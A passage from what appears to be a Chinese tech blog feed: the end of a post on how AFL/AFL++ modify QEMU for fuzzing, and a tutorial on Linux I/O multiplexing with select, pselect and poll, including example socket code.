class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> TranslationBlock *<span class="hljs-title function_">tb_find</span><span class="hljs-params">(CPUState *cpu,</span><br><span class="hljs-params">                                        TranslationBlock *last_tb,</span><br><span class="hljs-params">                                        <span class="hljs-type">int</span> tb_exit, <span class="hljs-type">uint32_t</span> cf_mask)</span><br>{<br>    ...<br>    <span class="hljs-keyword">if</span> (tb == <span class="hljs-literal">NULL</span>) {<br>        mmap_lock();<br>        tb = tb_gen_code(cpu, pc, cs_base, flags, cf_mask);<br>        was_translated = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 新翻译的基本块</span><br>        mmap_unlock();<br>        <span class="hljs-comment">/* We add the TB in the virtual pc hash table for the fast lookup */</span><br>        qatomic_set(&amp;cpu-&gt;tb_jmp_cache[tb_jmp_cache_hash_func(pc)], tb);<br>    }<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_USER_ONLY</span><br>    <span class="hljs-comment">/* We don't take care of direct jumps when address mapping changes in</span><br><span class="hljs-comment">     * system emulation. So it's not safe to make a direct jump to a TB</span><br><span class="hljs-comment">     * spanning two pages because the mapping for the second page can change.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (tb-&gt;page_addr[<span class="hljs-number">1</span>] != <span class="hljs-number">-1</span>) {<br>        last_tb = <span class="hljs-literal">NULL</span>;<br>    }<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">/* See if we can patch the calling TB. */</span><br>    <span class="hljs-keyword">if</span> (last_tb) {<br>        tb_add_jump(last_tb, tb_exit, tb);<br>        was_chained = <span class="hljs-literal">true</span>;<br>    }<br>    <span class="hljs-keyword">if</span> (was_translated || was_chained) {<br>        afl_request_tsl(pc, cs_base, flags, cf_mask,<br>                        was_chained ? last_tb : <span class="hljs-literal">NULL</span>, tb_exit);  <span class="hljs-comment">// &lt;=== 如果有新翻译的基本块或者新构建的chain，则通知forkserver更新缓存</span><br>    }<br>    <span class="hljs-keyword">return</span> tb;<br>}<br></code></pre></td></tr></tbody></table></figure><p>与<code>afl_request_tsl()</code>相匹配的是<code>afl_wait_tsl()</code>，该函数检查当前缓存的TB，如果是新TB，则判断该TB的PC是否合法。这里源码注释中描述到：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!tb) {<br><br>  <span class="hljs-comment">/* The child may request to transate a block of memory that is not</span><br><span class="hljs-comment">     mapped in the parent (e.g. jitted code or dlopened code).</span><br><span class="hljs-comment">     This causes a SIGSEV in gen_intermediate_code() and associated</span><br><span class="hljs-comment">     subroutines. We simply avoid caching of such blocks. */</span><br><br>  <span class="hljs-keyword">if</span> (is_valid_addr(t.tb.pc)) {<br><br>    mmap_lock();<br>    tb = tb_gen_code(cpu, t.tb.pc, t.tb.cs_base, t.tb.flags, t.tb.cf_mask);<br>    mmap_unlock();<br><br>  } <span class="hljs-keyword">else</span> {<br><br>    invalid_pc = <span class="hljs-number">1</span>;<br><br>  }<br><br>}<br></code></pre></td></tr></tbody></table></figure><p>也就是说，如果子进程请求翻译一个没有在父进程中映射的内存块时，这会导致在<code>gen_intermediate_code()</code>函数以及后续相关联的程序中发生SEGV的错误因此应当避免缓存这类块，因此这里做了一个过滤操作。</p><p>此外，该版本的改进还额外支持了AFL中的<code>persistent</code>模式，此节不再详细介绍，感兴趣的读者可以阅读[qemuafl的源码](<a href="https://github.com/AFLplusplus/qemuafl/">AFLplusplus/qemuafl: This fork of QEMU enables fuzzing userspace ELF binaries under AFL++. (github.com)</a>)</p><h2 id="3-小结"><a href="#3-小结" class="headerlink" title="3. 小结"></a>3. 小结</h2><ul><li>QEMU本质上就是用软件去模拟不同平台下的程序运行的一个虚拟机</li><li>AFL/AFL++对QEMU源码进行了适当的魔改，使其能够与模糊器进行通信并完成相关覆盖率的统计或其他功能</li><li>不建议使用AFL提供的一键安装QEMU的脚本，建议使用AFL++中魔改过后的QEMU版本：<a href="https://github.com/AFLplusplus/qemuafl/">AFLplusplus/qemuafl: This fork of QEMU enables fuzzing userspace ELF binaries under AFL++. (github.com)</a></li></ul><h2 id="link-Reference"><a href="#link-Reference" class="headerlink" title=":link: Reference:"></a><span class="github-emoji"><span>🔗</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f517.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> Reference:</h2><ol><li><a href="https://github.com/lishuhuakai/qemu_reading/tree/main/Document/qemu-0.1.6">https://github.com/lishuhuakai/qemu_reading/tree/main/Document/qemu-0.1.6</a></li><li>[Translator Internals — QEMU documentation](<a href="https://www.qemu.org/docs/master/devel/tcg.html#:~:text=QEMU">https://www.qemu.org/docs/master/devel/tcg.html#:~:text=QEMU</a> is a dynamic translator,simple while achieving good performances.)</li><li>Bellard, Fabrice. “QEMU, a fast and portable dynamic translator.” <em>USENIX annual technical conference, FREENIX Track</em>. Vol. 41. 2005.</li><li><a href="https://xz.aliyun.com/t/6457">基于qemu和unicorn的Fuzz技术分析 - 先知社区 (aliyun.com)</a></li><li><a href="https://www.cnblogs.com/revercc/p/16294051.html">Linux中ELF文件启动过程 - 怎么可以吃突突 - 博客园 (cnblogs.com)</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>模糊测试</tag>
      
      <tag>AFL</tag>
      
      <tag>QEMU</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于Linux IO多路复用那些事</title>
    <link href="/2023/07/10/%E5%85%B3%E4%BA%8ELinux%20IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <url>/2023/07/10/%E5%85%B3%E4%BA%8ELinux%20IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="关于I-x2F-O多路复用那些事"><a href="#关于I-x2F-O多路复用那些事" class="headerlink" title="关于I/O多路复用那些事"></a>关于I/O多路复用那些事</h1><p><strong>Q1：为什么需要I/O多路复用？</strong>[1]</p><p><strong>A1：</strong></p><ul><li><p>TCP Socket只能实现一对一通信 ==&gt; 同步<strong>阻塞</strong>（连接请求饥饿性）：read阻塞直到请求数据传送过来并write</p><p><span class="github-emoji"><span>🤔</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 如果没有I/O多路复用，那如何更好服务更多的用户？</p><ul><li>一个请求对应一个线程 ==&gt; 维护一个线程池</li><li>线程池的缺点：1）如何确定预先分配的线程池中线程的数量？如果分配少了，但连接数激增，可能会导致程序直接崩溃或者上下文切换的开销太大导致程序<strong>运行效率很低</strong>；如果分配过多，但连接数很少，会导致已分配的线程得不到利用而造成<strong>资源浪费</strong></li></ul></li><li><p>I/O（时分）多路复用：一个线程维护多个Socket</p></li></ul><hr><p><strong>Q2：如何进行I/O多路复用？</strong></p><p><strong>A2：</strong></p><ul><li><p>使用一个操作系统机制来轮询一组文件描述符，在Linux中，主要有三种操作：<strong>select</strong>、<strong>poll</strong>和<strong>epoll</strong></p></li><li><p>Linux（Unix）操作系统内核提供给用户态的多路复用<strong>系统调用</strong>（select、poll、epoll），进程可以通过一个系统调用函数从内核中获取多个事件</p></li></ul><hr><h2 id="E1：Select系统调用"><a href="#E1：Select系统调用" class="headerlink" title="E1：Select系统调用"></a><strong>E1：Select系统调用</strong></h2><ul><li><p>函数签名[3-4]：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">select</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-type">int</span> nfds, <span class="hljs-comment">// 所允许设置的最大文件描述符值+1</span></span><br><span class="hljs-params">    fd_set *readfds,<span class="hljs-comment">// 读文件描述符集合（select返回后，readfds仅保留那些准备读取的文件描述符）</span></span><br><span class="hljs-params">    fd_set *writefds,<span class="hljs-comment">// 写文件描述符集合（select返回后，readfds仅保留那些准备写的文件描述符）</span></span><br><span class="hljs-params">    fd_set *exceptfds,<span class="hljs-comment">// 监控异常条件（exceptional conditions）</span></span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> timeval *timeout<span class="hljs-comment">// timeval结构体，用来描述超时信息（全0表示立刻返回，为NULL表示无限等待）</span></span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></tbody></table></figure></li><li><p><span class="github-emoji"><span>⭐</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> select()调用接触阻塞的条件：</p><ul><li>任意一个文件描述符准备好了</li><li>调用被一个信号处理器所中断</li><li>超时 [由参数timeout控制]</li></ul></li><li><p>与fd_set操作有关的宏：</p><ul><li>**FD_ZERO()**：清空set</li><li>**FD_SET()**：将fd添加到set中</li><li>**FD_CLR()**：将fd从set中移除</li><li>**FD_ISSET()**：可以在调用select()之后，检查某一个文件描述符是否仍然在一个集合中，返回非0表示该文件描述符在集合中，否则返回0</li></ul></li><li><p><strong>pselect()</strong></p><ul><li><p>函数签名：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pselect</span><span class="hljs-params">(<span class="hljs-type">int</span> nfds, fd_set *_Nullable <span class="hljs-keyword">restrict</span> readfds,</span><br><span class="hljs-params">                  fd_set *_Nullable <span class="hljs-keyword">restrict</span> writefds,</span><br><span class="hljs-params">                  fd_set *_Nullable <span class="hljs-keyword">restrict</span> exceptfds,</span><br><span class="hljs-params">                  <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec *_Nullable <span class="hljs-keyword">restrict</span> timeout,</span><br><span class="hljs-params">                  <span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *_Nullable <span class="hljs-keyword">restrict</span> sigmask)</span>;<br></code></pre></td></tr></tbody></table></figure></li><li><p>提供额外一个信号掩码操作，允许更安全的调用select</p></li><li><p>与select()的区别：</p><p>(1) 超时参数的结构体不一样：在<code>select()</code>中是<code>struct timeval</code>（秒+毫秒），而在<code>pselect()</code>中是<code>struct timespec</code>（秒+纳秒）</p><p>(2) 是否修改timeout值：<code>select()</code>可能会将timeout值更新为还剩下的时间，而<code>pselect()</code>则不会修改</p><p>(3) sigmask参数</p></li><li><p>与select()之间的等价表述：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">ready = pselect(nfds, &amp;readfds, &amp;writefds, &amp;exceptfds,<br>                           timeout, &amp;sigmask);<br><span class="hljs-comment">// Same as ---|:</span><br><span class="hljs-comment">//            v</span><br><span class="hljs-type">sigset_t</span> origmask;<br><br>pthread_sigmask(SIG_SETMASK, &amp;sigmask, &amp;origmask);<br>ready = select(nfds, &amp;readfds, &amp;writefds, &amp;exceptfds, timeout);<br>pthread_sigmask(SIG_SETMASK, &amp;origmask, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></tbody></table></figure></li></ul></li><li><p><span class="github-emoji"><span>🌰</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f330.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>[2]</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/select.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXBUF 256</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">child_process</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>{<br>  sleep(<span class="hljs-number">2</span>); <span class="hljs-comment">// make sure that server is started</span><br>  <span class="hljs-type">char</span> msg[MAXBUF];<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">addr</span> =</span> {<span class="hljs-number">0</span>};<br>  <span class="hljs-type">int</span> n, sockfd, num=<span class="hljs-number">1</span>;<br>  srandom(getpid());<br>  <span class="hljs-comment">/* Create socket and connect to server */</span><br>  sockfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>  addr.sin_family = AF_INET;<br>  addr.sin_port = htons(<span class="hljs-number">2000</span>);<br>  addr.sin_addr.s_addr = inet_addr(<span class="hljs-string">"127.0.0.1"</span>);<br><br>  connect(sockfd, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;addr, <span class="hljs-keyword">sizeof</span>(addr));<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"child {%d} connected \n"</span>, getpid());<br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){  <span class="hljs-comment">// dead loop</span><br>        <span class="hljs-type">int</span> sl = (random() % <span class="hljs-number">10</span>) +  <span class="hljs-number">1</span>;<br>        num++;<br>     sleep(sl);<br>  <span class="hljs-built_in">sprintf</span> (msg, <span class="hljs-string">"Test message %d from client %d"</span>, num, getpid());<br>  n = write(sockfd, msg, <span class="hljs-built_in">strlen</span>(msg));<span class="hljs-comment">/* Send message */</span><br>  }<br><br>}<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">char</span> buffer[MAXBUF];<br>  <span class="hljs-type">int</span> fds[<span class="hljs-number">5</span>];<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">addr</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">client</span>;</span><br>  <span class="hljs-type">int</span> addrlen, n,i,max=<span class="hljs-number">0</span>;<br>  <span class="hljs-type">int</span> sockfd, commfd;<br>  fd_set rset;<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>  {<br>  <span class="hljs-keyword">if</span>(fork() == <span class="hljs-number">0</span>)<br>  {<br>  child_process();<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  }<br>  }<br><br>  sockfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">memset</span>(&amp;addr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (addr));<br>  addr.sin_family = AF_INET;<br>  addr.sin_port = htons(<span class="hljs-number">2000</span>);<br>  addr.sin_addr.s_addr = INADDR_ANY;<br>  bind(sockfd,(<span class="hljs-keyword">struct</span> sockaddr*)&amp;addr, <span class="hljs-keyword">sizeof</span>(addr));<br>  listen (sockfd, <span class="hljs-number">5</span>); <br><br>  <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++) <br>  {<br>    <span class="hljs-built_in">memset</span>(&amp;client, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (client));<br>    addrlen = <span class="hljs-keyword">sizeof</span>(client);<br>    fds[i] = accept(sockfd,(<span class="hljs-keyword">struct</span> sockaddr*)&amp;client, &amp;addrlen);<br>    <span class="hljs-keyword">if</span>(fds[i] &gt; max)<br>    max = fds[i];<br>  }<br>  <br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){<br>FD_ZERO(&amp;rset);<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i&lt; <span class="hljs-number">5</span>; i++ ) {<br>  FD_SET(fds[i],&amp;rset);<br>  }<br><br>   <span class="hljs-built_in">puts</span>(<span class="hljs-string">"round again"</span>);<br>select(max+<span class="hljs-number">1</span>, &amp;rset, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++) {<br><span class="hljs-keyword">if</span> (FD_ISSET(fds[i], &amp;rset)){ <span class="hljs-comment">// 如果文件描述符在这个集合里，意味着该文件描述符可读</span><br><span class="hljs-built_in">memset</span>(buffer,<span class="hljs-number">0</span>,MAXBUF);<br>read(fds[i], buffer, MAXBUF);<br><span class="hljs-built_in">puts</span>(buffer);<br>}<br>}<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure></li><li><p><span class="github-emoji"><span>🤔</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 这里为什么需要传入nfds并告诉<code>select()</code>当前所有文件描述符中最大值+1？</p><p><strong>A:</strong> 与fd_set的实现有关：每个fd表示为一个比特，fd_set是一个32个整数的数组，共1024比特；我们进一步假设有5个文件描述符，但最高的文件描述符值是900，那么函数将会检查从0到900的比特而不需要检查到1024</p></li></ul><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>在每一次调用之前，需要构造每一个集合（三个集合）</li><li>函数逐位检查到最大文件描述符值 - 复杂度：O(n)</li><li>需要在select调用之后检查文件描述符是否在select返回的集合中，如果在，则进行相应的处理</li><li>select最多只能监听1024个文件描述符（底层使用BitsMap实现）</li></ul><h2 id="E2：Poll系统调用"><a href="#E2：Poll系统调用" class="headerlink" title="E2：Poll系统调用"></a>E2：Poll系统调用</h2><ul><li><p>函数签名[5]：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">poll</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> pollfd *fds,</span><br><span class="hljs-params">    <span class="hljs-type">nfds_t</span> nfds,<span class="hljs-comment">// fds数组元素个数！（注意这里与select()函数的区别）</span></span><br><span class="hljs-params">    <span class="hljs-type">int</span> timeout</span><br><span class="hljs-params">)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">ppoll</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> pollfd *fds, <span class="hljs-type">nfds_t</span> nfds,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec *_Nullable tmo_p,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *_Nullable sigmask</span><br><span class="hljs-params">)</span>;<br><span class="hljs-comment">/* struct pollfd */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> {</span><br>    <span class="hljs-type">int</span>   fd;         <span class="hljs-comment">/* file descriptor */</span><br>    <span class="hljs-type">short</span> events;     <span class="hljs-comment">/* requested events */</span><br>    <span class="hljs-type">short</span> revents;    <span class="hljs-comment">/* returned events */</span><br>};<br><br></code></pre></td></tr></tbody></table></figure></li><li><p><code>poll()</code>调用阻塞接触逻辑与<code>select()</code>一样</p></li><li><p>在events和revents（poll.h）中定义的比特：</p><ul><li><strong>POLLIN</strong>：有数据要读</li><li><strong>POLLPRI</strong>：文件描述符存在一些异常，可能包括：TCP socket中有带外数据等</li><li><strong>POLLOUT</strong>：可写</li><li><strong>POLLRDHUP</strong>：流socket关闭连接 or 连接途中关闭写操作</li><li><strong>POLLERR</strong>：错误条件 *</li><li><strong>POLLHUP</strong>：挂起 *</li><li><strong>POLLNVAL</strong>：无效请求，fd未打开 *</li></ul><p>ps: * 表示只会出现在revents中</p></li><li><p><span class="github-emoji"><span>🌰</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f330.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 将上述<code>select()</code>示例代码进行相应的修改</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br>...<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> pollfds[<span class="hljs-number">5</span>];<br>    ...<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++) <br>    {<br>        <span class="hljs-built_in">memset</span>(&amp;client, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span> (client));<br>        addrlen = <span class="hljs-built_in">sizeof</span>(client);<br>        pollfds[i].fd = <span class="hljs-built_in">accept</span>(sockfd,(<span class="hljs-keyword">struct</span> sockaddr*)&amp;client, &amp;addrlen);<br>        pollfds[i].events = POLLIN;<br>    }<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"round again"</span>);<br>        <span class="hljs-built_in">poll</span>(pollfds, <span class="hljs-number">5</span>, <span class="hljs-number">50000</span>);<br><br>        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++) {<br>            <span class="hljs-keyword">if</span> (pollfds[i].revents &amp; POLLIN){<br>                pollfds[i].revents = <span class="hljs-number">0</span>;<br>                <span class="hljs-built_in">memset</span>(buffer,<span class="hljs-number">0</span>,MAXBUF);<br>                <span class="hljs-built_in">read</span>(pollfds[i].fd, buffer, MAXBUF);<br>                <span class="hljs-built_in">puts</span>(buffer);<br>            }<br>        }<br>    }<br>    ...<br></code></pre></td></tr></tbody></table></figure><p>运行结果：</p><p><img src="/2023/07/10/%E5%85%B3%E4%BA%8ELinux%20IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E9%82%A3%E4%BA%9B%E4%BA%8B/1.png"></p></li></ul><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>**poll() <span class="github-emoji"><span>🆚</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f19a.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> select(): **</p><ul><li><p><code>poll()</code>不需要使用者计算最大文件描述符值+1的值。</p></li><li><p><code>poll()</code>对于大数值的文件描述符来说更有效。仍然假设最大值为900的五个文件描述符，<code>poll()</code>仅需遍历5次，而使用<code>select()</code>则需要遍历900次</p></li><li><p><code>select()</code>的文件描述符集合是定长的（1024）</p></li><li><p>在<code>select()</code>中，文件描述符集合在返回时重新构建，因此随后每一次调用时都需要重新初始化他们：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){<br>FD_ZERO(&amp;rset);<br> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i&lt; <span class="hljs-number">5</span>; i++ ) {<br> FD_SET(fds[i],&amp;rset);   <span class="hljs-comment">// &lt;================= 重新初始化！</span><br> }<br>  <br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"round again"</span>);<br>select(max+<span class="hljs-number">1</span>, &amp;rset, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>  <br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++) {<br><span class="hljs-keyword">if</span> (FD_ISSET(fds[i], &amp;rset)){ <span class="hljs-comment">// 如果文件描述符在这个集合里，意味着该文件描述符可读</span><br><span class="hljs-built_in">memset</span>(buffer,<span 